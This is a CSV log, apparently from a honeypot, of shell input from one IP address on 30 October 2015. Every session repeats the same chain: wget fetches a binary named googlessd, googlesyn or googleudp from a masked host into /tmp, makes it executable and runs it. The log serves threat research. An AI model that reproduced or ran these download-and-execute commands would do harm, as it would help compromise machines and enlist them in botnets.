ip,timestamp,input
"222.186.34.75","2015-10-30 07:26:07","cd /tmp"
"222.186.34.75","2015-10-30 07:26:11","chmod 777 ./googlessd"
"222.186.34.75","2015-10-30 07:26:15","./googlessd"
"222.186.34.75","2015-10-30 07:26:19","exit"
"222.186.34.75","2015-10-30 07:38:59","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-30 07:39:03","cd /tmp"
"222.186.34.75","2015-10-30 07:39:07","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-30 07:39:11","./googlesyn"
"222.186.34.75","2015-10-30 07:39:15","exit"
"222.186.34.75","2015-10-30 07:43:09","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-30 07:43:13","cd /tmp"
"222.186.34.75","2015-10-30 07:43:17","chmod 777 ./googlessd"
"222.186.34.75","2015-10-30 07:43:21","./googlessd"
"222.186.34.75","2015-10-30 07:43:25","exit"
"222.186.34.75","2015-10-30 07:48:30","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-30 07:48:33","cd /tmp"
"222.186.34.75","2015-10-30 07:48:38","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-30 07:48:41","./googlesyn"
"222.186.34.75","2015-10-30 07:48:45","exit"
"222.186.34.75","2015-10-30 07:50:53","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-30 07:50:56","cd /tmp"
"222.186.34.75","2015-10-30 07:51:00","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-30 07:51:04","./googlesyn"
"222.186.34.75","2015-10-30 07:51:08","exit"
"222.186.34.75","2015-10-30 07:54:44","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-30 07:54:48","cd /tmp"
"222.186.34.75","2015-10-30 07:54:52","chmod 777 ./googlessd"
"222.186.34.75","2015-10-30 07:54:56","./googlessd"
"222.186.34.75","2015-10-30 07:55:00","exit"
"222.186.34.75","2015-10-30 07:57:08","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-30 07:57:12","cd /tmp"
"222.186.34.75","2015-10-30 07:57:16","chmod 777 ./googlessd"
"222.186.34.75","2015-10-30 07:57:21","./googlessd"
"222.186.34.75","2015-10-30 07:57:24","exit"
"222.186.34.75","2015-10-30 08:01:55","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-30 08:01:59","cd /tmp"
"222.186.34.75","2015-10-30 08:02:03","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-30 08:02:07","./googlesyn"
"222.186.34.75","2015-10-30 08:02:11","exit"
"222.186.34.75","2015-10-30 08:07:08","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-30 08:07:12","cd /tmp"
"222.186.34.75","2015-10-30 08:07:17","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-30 08:07:31","./googlesyn"
"222.186.34.75","2015-10-30 08:07:31","exit"
"222.186.34.75","2015-10-30 08:07:32","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-30 08:07:35","cd /tmp"
"222.186.34.75","2015-10-30 08:07:40","chmod 777 ./googlessd"
"222.186.34.75","2015-10-30 08:07:43","./googlessd"
"222.186.34.75","2015-10-30 08:07:47","exit"
"222.186.34.75","2015-10-30 08:10:19","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-30 08:10:24","cd /tmp"
"222.186.34.75","2015-10-30 08:10:55","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-30 08:10:56","./googlesyn"
"222.186.34.75","2015-10-30 08:10:56","exit"
"222.186.34.75","2015-10-30 08:14:12","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-30 08:14:16","cd /tmp"
"222.186.34.75","2015-10-30 08:14:20","chmod 777 ./googlessd"
"222.186.34.75","2015-10-30 08:14:24","./googlessd"
"222.186.34.75","2015-10-30 08:14:27","exit"
"222.186.34.75","2015-10-30 08:14:54","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-30 08:15:17","cd /tmp"
"222.186.34.75","2015-10-30 08:15:18","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-30 08:15:18","./googlesyn"
"222.186.34.75","2015-10-30 08:15:18","exit"
"222.186.34.75","2015-10-30 08:15:19","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-30 08:15:22","cd /tmp"
"222.186.34.75","2015-10-30 08:15:26","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-30 08:15:30","./googlesyn"
"222.186.34.75","2015-10-30 08:15:33","exit"
"222.186.34.75","2015-10-30 08:23:01","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-30 08:23:05","cd /tmp"
"222.186.34.75","2015-10-30 08:23:09","chmod 777 ./googlessd"
"222.186.34.75","2015-10-30 08:23:28","./googlessd"
"222.186.34.75","2015-10-30 08:23:28","exit"
"222.186.34.75","2015-10-30 08:23:28","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-30 08:23:32","cd /tmp"
"222.186.34.75","2015-10-30 08:23:36","chmod 777 ./googlessd"
"222.186.34.75","2015-10-30 08:23:40","./googlessd"
"222.186.34.75","2015-10-30 08:23:44","exit"
"222.186.34.75","2015-10-30 08:26:56","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-30 08:26:59","cd /tmp"
"222.186.34.75","2015-10-30 08:27:03","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-30 08:27:07","./googlesyn"
"222.186.34.75","2015-10-30 08:27:11","exit"
"222.186.34.75","2015-10-30 08:35:01","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-30 08:35:05","cd /tmp"
"222.186.34.75","2015-10-30 08:35:09","chmod 777 ./googlessd"
"222.186.34.75","2015-10-30 08:35:13","./googlessd"
"222.186.34.75","2015-10-30 08:35:17","exit"
"222.186.34.75","2015-10-30 08:48:42","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-30 08:48:46","cd /tmp"
"222.186.34.75","2015-10-30 08:48:50","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-30 08:48:54","./googlesyn"
"222.186.34.75","2015-10-30 08:48:58","exit"
"222.186.34.75","2015-10-30 08:52:25","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-30 08:52:28","cd /tmp"
"222.186.34.75","2015-10-30 08:52:32","chmod 777 ./googlessd"
"222.186.34.75","2015-10-30 08:52:48","./googlessd"
"222.186.34.75","2015-10-30 08:52:49","exit"
"222.186.34.75","2015-10-30 08:52:49","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-30 08:52:53","cd /tmp"
"222.186.34.75","2015-10-30 08:52:57","chmod 777 ./googlessd"
"222.186.34.75","2015-10-30 08:53:01","./googlessd"
"222.186.34.75","2015-10-30 08:53:05","exit"
"222.186.34.75","2015-10-30 09:13:43","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-30 09:14:00","cd /tmp"
"222.186.34.75","2015-10-30 09:14:00","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-30 09:14:00","./googlesyn"
"222.186.34.75","2015-10-30 09:14:00","exit"
"222.186.34.75","2015-10-30 09:14:01","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-30 09:14:04","cd /tmp"
"222.186.34.75","2015-10-30 09:14:08","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-30 09:14:12","./googlesyn"
"222.186.34.75","2015-10-30 09:14:16","exit"
"222.186.34.75","2015-10-30 09:17:04","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-30 09:17:07","cd /tmp"
"222.186.34.75","2015-10-30 09:17:12","chmod 777 ./googlessd"
"222.186.34.75","2015-10-30 09:17:40","./googlessd"
"222.186.34.75","2015-10-30 09:17:40","exit"
"222.186.34.75","2015-10-30 09:17:41","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-30 09:17:44","cd /tmp"
"222.186.34.75","2015-10-30 09:17:48","chmod 777 ./googleudp"
"222.186.34.75","2015-10-30 09:17:52","./googleudp"
"222.186.34.75","2015-10-30 09:17:56","exit"
"222.186.34.75","2015-10-30 09:29:58","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-30 09:30:01","cd /tmp"
"222.186.34.75","2015-10-30 09:30:06","chmod 777 ./googleudp"
"222.186.34.75","2015-10-30 09:30:09","./googleudp"
"222.186.34.75","2015-10-30 09:30:13","exit"
"222.186.34.75","2015-10-30 09:49:46","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-30 09:49:50","cd /tmp"
"222.186.34.75","2015-10-30 09:49:54","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-30 09:49:58","./googlesyn"
"222.186.34.75","2015-10-30 09:50:02","exit"
"222.186.34.75","2015-10-30 09:50:42","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-30 09:50:46","cd /tmp"
"222.186.34.75","2015-10-30 09:50:50","chmod 777 ./googlessd"
"222.186.34.75","2015-10-30 09:50:54","./googlessd"
"222.186.34.75","2015-10-30 09:50:58","exit"
"222.186.34.75","2015-10-30 09:52:23","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-30 09:52:27","cd /tmp"
"222.186.34.75","2015-10-30 09:52:31","chmod 777 ./googlessd"
"222.186.34.75","2015-10-30 09:52:35","./googlessd"
"222.186.34.75","2015-10-30 09:52:39","exit"
"222.186.34.75","2015-10-30 09:58:55","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-30 09:58:58","cd /tmp"
"222.186.34.75","2015-10-30 09:59:02","chmod 777 ./googleudp"
